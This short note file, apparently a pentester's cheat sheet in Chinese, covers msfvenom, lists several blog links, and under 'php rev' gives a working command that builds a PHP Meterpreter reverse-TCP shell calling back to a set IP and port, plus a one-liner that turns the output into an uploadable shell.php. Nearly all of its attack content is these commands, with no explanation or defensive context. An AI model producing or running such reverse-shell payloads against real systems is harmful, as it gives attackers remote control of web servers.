# msfvenom
 metasploit 更新后就移除了 msfencode 以及 msfpayload

 http://www.freebuf.com/sectool/69362.html
 http://blog.51cto.com/biock/1658668
 http://www.secist.com/archives/1070.html
 http://blog.csdn.net/lijia111111/article/details/64124693

# php rev
msfvenom -p php/meterpreter_reverse_tcp LHOST=172.29.103.207 LPORT=4433 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php